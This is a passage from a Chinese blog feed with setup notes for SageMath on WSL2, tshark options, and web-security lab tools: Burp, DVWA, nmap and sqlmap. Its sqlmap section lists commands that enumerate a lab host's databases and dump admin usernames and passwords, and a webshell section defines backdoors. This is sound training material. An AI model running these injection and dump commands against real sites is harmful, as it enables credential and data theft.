<a href="https://www.cnblogs.com/ZimaBlue/p/18012277">https://www.cnblogs.com/ZimaBlue/p/18012277</a></p>
</blockquote>
<h1>安装wsl2</h1>
<blockquote>
<p>必须运行 Windows 10 版本 2004 及更高版本（内部版本 19041 及更高版本）或 Windows 11 才能使用以下命令。</p>
</blockquote>
<p>在管理员模式下打开 PowerShell 或 Windows 命令提示符，方法是右键单击并选择“以管理员身份运行”，输入 wsl --install 命令，然后重启计算机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
<p><em>默认安装的是Ubuntu</em></p>
<p>需要注意：关键一步是在控制面板-启用或关闭windows功能中勾选<strong>适用于Linux的windows子系统</strong></p>
<h2 id="检查正在运行的wsl版本">检查正在运行的wsl版本</h2>
<p>可列出已安装的 Linux 发行版，并通过在 PowerShell 或 Windows 命令提示符中输入以下命令来检查每个发行版的 WSL 版本：<code>wsl -l -v</code>。</p>
<p>查看所安装的 <code>Linux</code> 版本，使用命令： <code>wsl --list</code> 。</p>
<p>如有需要，使用下面命令将ArchLinux设为默认系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --set-default Arch</span><br><span class="line"><span class="comment"># 如未修改未默认系统，则使用以下命令</span></span><br><span class="line">wsl -d Arch</span><br></pre></td></tr></table></figure>
<h2 id="配置pacman">配置pacman</h2>
<p>配置<code>pacman</code>镜像源，改为国内的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<p>后增加以下内容：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span><br></pre></td></tr></table></figure>
<p>输入下面命令，配置pacman key：</p>
<p><strong>ATTENTION!</strong><br>
此处配置不当会在后续更新系统中，验签出现问题。</p>
<blockquote>
<p>参考资料：<a href="https://github.com/yuk7/ArchWSL/issues/317">https://github.com/yuk7/ArchWSL/issues/317</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">killall gpg-agent</span><br><span class="line"><span class="built_in">rm</span> -rf /etc/pacman.d/gnupg/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate archlinux</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure>
<p><strong>更新系统：</strong>（非常关键，不更新后续安装 jupyter notebook 会出错）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure>
<p>配置archlinuxcn镜像源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>
<p>增加以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>
<p>安装archlinuxcn的key：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Sy archlinuxcn-keyring</span><br></pre></td></tr></table></figure>
<h2 id="配置用户">配置用户</h2>
<p>添加用户名以及对应密码即可。</p>
<h1>安装sage</h1>
<p>使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy sagemath</span><br></pre></td></tr></table></figure>
<p>安装即可。<br>
安装完成后，可以使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage</span><br></pre></td></tr></table></figure>
<p>来启动 sage 查看是否安装成功。查看完后使用 exit 退出即可。</p>
<h2 id="安装-JupyterLab">安装 JupyterLab</h2>
<p>使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jupyterlab (或者改为 jupyter notebook)</span><br></pre></td></tr></table></figure>
<p>安装即可</p>
<h2 id="在-JupyterLab-中-启动-Sage">在 JupyterLab 中 启动 Sage</h2>
<p>在 ArchLinux 中使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage -n jupyterlab --no-browser --allow-root</span><br></pre></td></tr></table></figure>
<p>此时可以使用跳转出来的窗口里面包含的<code>token</code>。</p>
<p>使用vscode + jupyter notebook server的形式，从而实现<code>sagemath10</code>的服务器调用。</p>
<p>退出时使用 <code>ctrl+c</code> 即可。</p>
<h1>sage中安装第三方库</h1>
<p>虽然不知道原理，但是主要使用以下命令进行安装第三方库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S python-pycryptdome</span><br><span class="line">pacman -S python-gmpy2</span><br><span class="line">pacman -S netcat(然后默认安装即可)</span><br></pre></td></tr></table></figure>
<p>这样就能把常用的第三方库先安装到<code>sagemath 10</code>。</p>
<p>其他有需要再说吧哈哈。</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>sagemath</tag>
        <tag>wsl2</tag>
      </tags>
  </entry>
  <entry>
    <title>Tshark&amp;tcpdump</title>
    <url>/2023/11/06/tshark-tcpdump/</url>
    <content><![CDATA[<blockquote>
<p>reference:</p>
<p><a href="http://linux.51yip.com/search/tshark">tshark linux 命令 在线中文手册 (51yip.com)</a></p>
<p><a href="http://linux.51yip.com/search/tcpdump">tcpdump linux 命令 在线中文手册 (51yip.com)</a></p>
</blockquote>
<span id="more"></span><!--toc-->

<p>在Linux下，当我们需要抓取网络数据包分析时，通常是使用tcpdump抓取网络raw数据包存到一个文件，然后下载到本地使用wireshark界面网络分析工具进行网络包分析。<br>最近才发现，原来wireshark也提供有Linux命令行工具-tshark。tshark不仅有抓包的功能，还带了解析各种协议的能力。下面我们以两个实例来介绍tshark工具。</p>
<p>主要参数：</p>
<ol>
<li>抓包接口类</li>
<li>-i 设置抓包的网络接口，不设置则默认为第一个非自环接口。</li>
<li>-D 列出当前存在的网络接口。在不了解OS所控制的网络设备时，一般先用“tshark -D”查看网络接口的编号以供-i参数使用。</li>
<li>-f 设定抓包过滤表达式（capture filter expression）。抓包过滤表达式的写法雷同于tcpdump，可参考tcpdump man page的有关部分。</li>
<li>-s 设置每个抓包的大小，默认为65535，多于这个大小的数据将不会被程序记入内存、写入文件。（这个参数相当于tcpdump的-s，tcpdump默认抓包的大小仅为68）</li>
<li>-p 设置网络接口以非混合模式工作，即只关心和本机有关的流量。</li>
<li>-B 设置内核缓冲区大小，仅对windows有效。</li>
<li>-y 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等。</li>
<li>-L 列出本机支持的数据链路层协议，供-y参数使用。  </li>
<li>抓包停止条件</li>
<li>-c 抓取的packet数，在处理一定数量的packet后，停止抓取，程序退出。</li>
<li>-a 设置tshark抓包停止向文件书写的条件，事实上是tshark在正常启动之后停止工作并返回的条件。条件写为test:value的形式，如“-a duration:5”表示tshark启动后在5秒内抓包然后停止；“-a filesize:10”表示tshark在输出文件达到10kB后停止；“-a files:n”表示tshark在写满n个文件后停止。（windows版的tshark0.99.3用参数“-a files:n”不起作用——会有无数多个文件生成。由于-b参数有自己的files参数，所谓“和-b的其它参数结合使用”无从说起。这也许是一个bug，或tshark的man page的书写有误。）</li>
<li>文件输出控制</li>
<li>-b 设置ring buffer文件参数。ring buffer的文件名由-w参数决定。-b参数采用test:value的形式书写。“-b duration:5”表示每5秒写下一个ring buffer文件；“-b filesize:5”表示每达到5kB写下一个ring buffer文件；“-b files:7”表示ring buffer文件最多7个，周而复始地使用，如果这个参数不设定，tshark会将磁盘写满为止。</li>
<li>文件输入</li>
<li>-r 设置tshark分析的输入文件。tshark既可以抓取分析即时的网络流量，又可以分析dump在文件中的数据。-r不能是命名管道和标准输入。</li>
<li>处理类</li>
<li>-R 设置读取（显示）过滤表达式（read filter expression）。不符合此表达式的流量同样不会被写入文件。注意，读取（显示）过滤表达式的语法和底层相关的抓包过滤表达式语法不相同，它的语法表达要丰富得多，请参考<a href="http://www.ethereal.com/docs/dfref/%E5%92%8Chttp://www.ethereal.com/docs/man-pages/ethereal-filter.4.html%E3%80%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E6%8A%93%E5%8C%85%E8%BF%87%E6%BB%A4%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%8C%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E6%97%B6%E6%9C%80%E5%A5%BD%E5%B0%86%E5%AE%83%E4%BB%ACquote%E8%B5%B7%E6%9D%A5%E3%80%82">http://www.ethereal.com/docs/dfref/和http://www.ethereal.com/docs/man-pages/ethereal-filter.4.html。类似于抓包过滤表达式，在命令行使用时最好将它们quote起来。</a></li>
<li>-n 禁止所有地址名字解析（默认为允许所有）。</li>
<li>-N 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。</li>
<li>-d 将指定的数据按有关协议解包输出。如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port&#x3D;&#x3D;8888,http”。注意选择子和解包协议之间不能留空格。</li>
<li>输出类</li>
<li>-w 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout。“-w-”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“&gt;”而不要-w参数。</li>
<li>-F 设置输出raw数据的格式，默认为libpcap。“tshark -F”会列出所有支持的raw格式。</li>
<li>-V 设置将解码结果的细节输出，否则解码结果仅显示一个packet一行的summary。</li>
<li>-x 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。</li>
<li>-T 设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text。</li>
<li>-t 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。</li>
<li>-S 在向raw文件输出的同时，将解码结果打印到控制台。</li>
<li>-l 在处理每个包时即时刷新输出。</li>
<li>-X 扩展项。</li>
<li>-q 设置安静的stdout输出（例如做统计时）</li>
<li>-z 设置统计参数。</li>
<li>其它</li>
<li>-h 显示命令行帮助。</li>
<li>-v 显示tshark的版本信息。</li>
<li>-o 重载选项。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Web-Commontools-Install</title>
    <url>/2024/12/02/web-commontools-install/</url>
    <content><![CDATA[<p>本文章主要简单介绍了web环境一些常见工具的下载以及安装，以及一些简单靶场环境（DVWA）的搭建。</p>
<span id="more"></span><!--toc-->
<h1>安装VMware</h1>
<blockquote>
<p><a href="https://www.vmware.com/">VMware by Broadcom - Cloud Computing for the Enterprise</a></p>
</blockquote>
<ul>
<li>安装VMware WorkStation Pro</li>
<li>安装虚拟环境便于多平台集成使用</li>
</ul>
<h1>安装kali</h1>
<blockquote>
<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p>
</blockquote>
<img src="/2024/12/02/web-commontools-install/image-20241202183622627.png" class="" title="image-20241202183622627">
<p>下载下来的压缩包，直接解压缩，使用VMware打开对应文件夹下的文件，即可直接导入kali虚拟环境。</p>
<p>默认用户名：kali</p>
<p>默认密码：kali</p>
<h1>安装Java</h1>
<blockquote>
<p><a href="https://blog.csdn.net/JasonXu94/article/details/143726390">Java8（JDK1.8）最新下载安装教程，附详细图文，适合新手，建议收藏_java 1.8下载-CSDN博客</a></p>
</blockquote>
<ul>
<li>主要需要配置<strong>环境变量</strong>
<ul>
<li>Path</li>
<li>创建JAVA_HOME，jdk的安装路径</li>
</ul>
</li>
<li>控制面板-系统-高级属性设置</li>
<li>查看是否安装成功
<ul>
<li>运行<code>java -version</code></li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202183547943.png" class="" title="image-20241202183547943">
<h1>安装burpsuite</h1>
<h2 id="kali">kali</h2>
<p>kali自带burpsuite，一般直接调用工具库即可。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202190344263.png" class="" title="image-20241202190344263">
<img src="/2024/12/02/web-commontools-install/image-20241202211219462.png" class="" title="image-20241202211219462">
<ul>
<li>
<p>利用<strong>burpsuite自带的浏览器</strong>，不需要额外配置就可以实现抓包</p>
</li>
<li>
<p>部分无法进行抓包，可参考<strong>本地环境进行配置</strong>实现抓包</p>
</li>
</ul>
<h2 id="本地环境">本地环境</h2>
<blockquote>
<p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter1.html">第一章 Burp Suite 安装和环境配置 · burpsuite实战指南</a></p>
</blockquote>
<ul>
<li>推荐使用firefox浏览器</li>
<li>安装插件-FoxyProxy</li>
<li>Option-Proxy，进行代理配置，<code>127.0.0.1:8080</code></li>
<li>访问：<code>http://burp</code>进行测试
<ul>
<li>Intercept-off</li>
<li>插件代理-on</li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212152785.png" class="" title="image-20241202212152785">
<h1>安装Navicat</h1>
<blockquote>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021">https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021</a></p>
</blockquote>
<ul>
<li>一定记得断网进行实现</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212358986.png" class="" title="image-20241202212358986">
<h1>安装PHP study+MySQL</h1>
<h2 id="配置MySQL环境">配置MySQL环境</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202213657613.png" class="" title="image-20241202213657613">
<p>进入命令行，使用<code>mysql --version</code>发现没成功。</p>
<p>打开<code>网站</code>，进入根目录，进入<code>Extensions</code>，把<code>MySQL</code>对应的目录进行复制。</p>
<p>配置环境变量，把复制的变量放在系统变量中。</p>
<p>默认用户名以及密码为<code>root</code>。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202214431254.png" class="" title="image-20241202214431254">
<p>命令行登录：<code>mysql -u [username] -p</code>，回车之后填入mysql对应的密码。</p>
<h2 id="配置Navicat-导入sql文件">配置Navicat+导入sql文件</h2>
<blockquote>
<p><a href="https://blog.csdn.net/tkf021004/article/details/136098343">【MySQL】如何运行sql文件（以Navicat做演示）_navicat运行sql文件-CSDN博客</a></p>
</blockquote>
<p>在上面成功的基础上，新建连接，输入对应的用户名以及密码。</p>
<p>测试连接，连接成功之后即可建立连接。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215004143.png" class="" title="image-20241202215004143">
<p><strong>字符集：</strong><br>
如果你的数据库版本为5.x :选择utf8<br>
如果你的数据库版本为8.0 :选择utf8mb4</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215157884.png" class="" title="image-20241202215157884">
<p>新建成功后，双击或者右击选择打开数据库，变成绿色之后，表明正常运行。</p>
<p>打开的基础上，右击<code>运行sql文件</code>。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215558254.png" class="" title="image-20241202215558254">
<p>无严重报错就可导入sql文件。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215715270.png" class="" title="image-20241202215715270">
<p>能执行成功，记得关闭数据库，然后重新打开，就能直接看到导入后的数据文件。</p>
<h2 id="搭建靶场环境-DVWA">搭建靶场环境-DVWA</h2>
<blockquote>
<p><a href="https://github.com/digininja/DVWA">GitHub - digi；ninja/DVWA: Damn Vulnerable Web Application (DVWA)</a></p>
<p><a href="https://blog.csdn.net/2302_82189125/article/details/135834194">如何搭建 DVWA 靶场保姆级教程（附链接）_dvwa靶场搭建-CSDN博客</a></p>
<p>其他靶场环境：pikachu</p>
</blockquote>
<img src="/2024/12/02/web-commontools-install/image-20241202225832201.png" class="" title="image-20241202225832201">
<p>新建数据库之前一般会要求修改<code>root</code>密码，新建数据库之后，再重新连接Navicat。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202225957800.png" class="" title="image-20241202225957800">
<p>配置网站。</p>
<p>使用设置的用户名以及密码登录网站。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230132938.png" class="" title="image-20241202230132938">
<p>标红的部分需要进行修改。</p>
<p><code>reCAPTCHA key</code>，在<code>DVWA/conifg.ini.php</code>中进行新增。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230518208.png" class="" title="image-20241202230518208">
<p>刷新后可看到修改。</p>
<p>其他参数，在<code>php.xxx/php.ini</code>中修改。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230726368.png" class="" title="image-20241202230726368">
<p>保存后，选择页面的<code>Create Database</code>，然后重新登录。</p>
<p>此时使用的用户名以及密码分别为<code>admin</code>以及<code>password</code>。（有5个默认用户名及密码）</p>
<img src="/2024/12/02/web-commontools-install/image-20241202231153916.png" class="" title="image-20241202231153916">
<p>进入到靶场环境。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230959512.png" class="" title="image-20241202230959512">
<p>可修改靶场难度。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202231737693.png" class="" title="image-20241202231737693">
<h1>安装Winhex</h1>
<blockquote>
<p><a href="http://www.winhex.com/winhex/">http://www.winhex.com/winhex/</a></p>
</blockquote>
<ul>
<li>查看文件16进制：文件类型相对较多，图片文件、音频文件、应用程序文件</li>
<li>查看镜像文件</li>
</ul>
<h1>安装Wireshark</h1>
<blockquote>
<p><a href="https://www.wireshark.org/download.html">Wireshark · Download</a></p>
</blockquote>
<ul>
<li>进行<strong>流量包分析</strong></li>
<li>文件后缀名：<code>.pcap</code>/<code>.pcapng</code></li>
</ul>
<h1>SQL语句</h1>
<blockquote>
<p>不区分大小写，有Navicat的情况下，可视化后相对容易查看执行后的结果。</p>
<p><a href="https://www.runoob.com/sql/sql-syntax.html">SQL 语法 | 菜鸟教程</a></p>
</blockquote>
<ul>
<li>使用数据库：<code>USE [DATABASE];</code></li>
<li>查看所有表格：<code>SHOW TABLES;</code></li>
<li>查看某张表的所有数据：<code>SELECT * FROM [TABLE]</code></li>
<li>查看某列的所有数据：<code>SELECT [COLUMN] FROM [TABLE];</code></li>
<li>查看指定表指定数据（条件）+ <code>WHERE</code>：<code>SELECT * FROM [TABLE] WHERE [CONDITION]</code></li>
</ul>
<p><em>where 子句又被称为条件子句，用于筛选查询出来的数据集，指定的条件语句中可以使用基本的算术、关系和逻辑运算，例如：&gt;,&lt;,=,!=,&amp;&amp;,||。</em></p>
<ul>
<li>……</li>
</ul>
<h2 id="常见命令">常见命令</h2>
<ul>
<li><strong>SELECT</strong> - 从数据库中提取数据</li>
<li><strong>UPDATE</strong> - 更新数据库中的数据</li>
<li><strong>DELETE</strong> - 从数据库中删除数据</li>
<li><strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
<li><strong>CREATE DATABASE</strong> - 创建新数据库</li>
<li><strong>ALTER DATABASE</strong> - 修改数据库</li>
<li><strong>CREATE TABLE</strong> - 创建新表</li>
<li><strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
<li><strong>DROP TABLE</strong> - 删除表</li>
</ul>
<p><strong>SELECT</strong>：用于从数据库中查询数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br><span class="line">ORDER BY column_name [ASC|DESC];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>column_name(s)</code>: 要查询的列。</li>
<li><code>table_name</code>: 要查询的表。</li>
<li><code>condition</code>: 查询条件（可选）。</li>
<li><code>ORDER BY</code>: 排序方式，<code>ASC</code> 表示升序，<code>DESC</code> 表示降序（可选）。</li>
</ul>
<p><strong>INSERT INTO</strong>：用于向数据库表中插入新数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, ...)</span><br><span class="line">VALUES (value1, value2, ...)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要插入数据的表。</li>
<li><code>column1, column2, ...</code>: 要插入数据的列。</li>
<li><code>value1, value2, ...</code>: 对应列的值。</li>
</ul>
<p><strong>UPDATE</strong>：用于更新数据库表中的现有数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要更新数据的表。</li>
<li><code>column1 = value1, column2 = value2, ...</code>: 要更新的列及其新值。</li>
<li><code>condition</code>: 更新条件。</li>
</ul>
<p><strong>DELETE</strong>：用于从数据库表中删除数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要删除数据的表。</li>
<li><code>condition</code>: 删除条件。</li>
</ul>
<p><strong>CREATE TABLE</strong>：用于创建新的数据库表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">    column1 data_type constraint,</span><br><span class="line">    column2 data_type constraint,</span><br><span class="line">    ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要创建的表名。</li>
<li><code>column1, column2, ...</code>: 表的列。</li>
<li><code>data_type</code>: 列的数据类型（如 <code>INT</code>、<code>VARCHAR</code> 等）。</li>
<li><code>constraint</code>: 列的约束（如 <code>PRIMARY KEY</code>、<code>NOT NULL</code> 等）。</li>
</ul>
<p><strong>ALTER TABLE</strong>：用于修改现有数据库表的结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD column_name data_type</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要修改的表。</li>
<li><code>column_name</code>: 要添加的列。</li>
<li><code>data_type</code>: 列的数据类型。</li>
</ul>
<p>或：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">DROP COLUMN column_name</span><br></pre></td></tr></table></figure>
<ul>
<li><code>column_name</code>: 要删除的列。</li>
</ul>
<p><strong>DROP TABLE</strong>：用于删除数据库表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE table_name</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: 要删除的表。</li>
</ul>
<h1>nmap</h1>
<blockquote>
<p>kali自带该功能</p>
<p><a href="https://nmap.org/man/zh/index.html">Nmap参考指南(Man Page)</a></p>
</blockquote>
<p>Nmap，即Network Mapper，是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p>
<p><strong>其基本功能有三个：一是探测一组主机是否在线；其次扫描主机端口，嗅探所提供的网络服务；还可以推断主机所用的操作系统。</strong></p>
<p>使用<code>nmap --help</code>查看提供功能。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202222747293.png" class="" title="image-20241202222747293">
<h2 id="单目标-多目标-网段扫描">单目标/多目标/网段扫描</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202232317440.png" class="" title="image-20241202232317440">
<ul>
<li>
<p><code>nmap -sP 172.16.5.156</code></p>
</li>
<li>
<p><code>nmap -sP 172.16.5.102 172.16.5.103</code></p>
</li>
<li>
<p><code>nmap -sP 172.16.5.*</code>/<code>nmap -sP 172.16.5.0/24</code></p>
</li>
<li>
<p>……x.x.x.x</p>
</li>
</ul>
<h2 id="端口扫描">端口扫描</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202232245140.png" class="" title="image-20241202232245140">
<p><em>从0～65535，每个端口对应一个服务</em></p>
<p><em>0-1023一般被用作知名服务器到端口</em></p>
<ul>
<li>
<p>http：80</p>
</li>
<li>
<p>https：443</p>
</li>
<li>
<p>ftp：21</p>
</li>
<li>
<p>ssh：22</p>
</li>
<li>
<p>rdp：3389</p>
</li>
<li>
<p>mysql：3306</p>
</li>
<li>
<p>mssql：1433</p>
</li>
<li>
<p>oracle：1521</p>
</li>
</ul>
<p><em>通常情况下（未指定端口）nmap默认扫描最有可能开启的1000个端口</em></p>
<p><strong>端口状态：</strong></p>
<ul>
<li>
<p>nmap提供了6个端口状态：</p>
</li>
<li>
<p>open：端口开放</p>
</li>
<li>
<p>closed：端口关闭</p>
</li>
<li>
<p>filtered：端口被过滤（防火墙等）</p>
</li>
<li>
<p>unfiltered：nmap不能确认端口是否开放，但是未被过滤（ACK扫描才会出现这种情况，可以换种扫描方式）</p>
</li>
<li>
<p>open|filtered：开放或者过滤的，nmap不能确认（不是完全被过滤的状态）。</p>
</li>
<li>
<p>closed|filtered：nmap不能确认端口是关闭的还是被过滤的。</p>
</li>
</ul>
<h1>sqlmap</h1>
<blockquote>
<p>kali自带该功能</p>
<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客</a></p>
<p>可使用靶场：sqli-lab。</p>
</blockquote>
<p>SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p>
<p>Sqlmap采用五种独特的SQL注入技术，分别是：</p>
<ul>
<li>
<p>基于布尔的盲注，即可以根据<strong>返回页面</strong>判断条件真假的注入。</p>
</li>
<li>
<p>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
</li>
<li>
<p>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
</li>
<li>
<p>联合查询注入，可以使用union的情况下的注入。</p>
</li>
<li>
<p>堆查询注入，可以同时执行多条语句的执行时的注入。</p>
</li>
</ul>
<h2 id="sqlmap基础注入">sqlmap基础注入</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 判断有无注入</span><br><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>”</span><br><span class="line"># 注入数据库</span><br><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>” —dbs</span><br><span class="line"># 注入表</span><br><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>” <span class="operator">-</span>D cimer —tables</span><br><span class="line"># 注入字段</span><br><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>” <span class="operator">-</span>D cimer <span class="operator">-</span>T admin —columns</span><br><span class="line"># 注入内容</span><br><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>” <span class="operator">-</span>D cimer <span class="operator">-</span>T admin <span class="operator">-</span>C “username,password” —dump</span><br></pre></td></tr></table></figure>
<p>基于SQL注入从面到点的过程，抓取SQL注入的流量，分析重点：放在<strong>靠后位置去找到关键数据</strong>。</p>
<h1>webshell</h1>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<h2 id="一句话木马">一句话木马</h2>
